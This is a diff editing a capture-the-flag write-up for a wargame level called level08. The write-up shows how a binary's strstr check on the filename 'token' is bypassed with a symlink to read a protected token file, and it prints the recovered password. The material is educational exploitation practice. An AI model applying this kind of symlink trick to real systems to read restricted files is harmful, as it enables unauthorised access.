@@ -1,8 +1,5 @@
 $> nm -u level08
-         w _Jv_RegisterClasses
-         w __gmon_start__
-         U __libc_start_main@@GLIBC_2.0
-         U __stack_chk_fail@@GLIBC_2.4
+[...]
          U err@@GLIBC_2.0
          U exit@@GLIBC_2.0
          U open@@GLIBC_2.0
@@ -10,13 +7,17 @@ $> nm -u level08
          U read@@GLIBC_2.0
          U strstr@@GLIBC_2.0
          U write@@GLIBC_2.0
+
 $> ./level08 token
 You may not access 'token'
-$> # level08 call strstr on argv[1] against "token"
-$> # So if "token" is a substring of argv[1] level08 will not open the file
-$> # Then we just need to change the name of the file
-$> ln -s ~/token /tmp/nekot
-$> ./level08 /tmp/nekot
+
+# level08 call strstr on argv[1] against "token"
+# So if "token" is a substring of argv[1] level08 will not open the file
+# Then we just need to change the name of the file, a symlink fulfill our use case here
+
+$> ln -s ~/token /tmp/exploit
+
+$> ./level08 /tmp/exploit
 quif5eloekouj29ke0vouxean
-$> su flag08 # With password above
-$> getflag
+
+# Here is our password for flag08 !
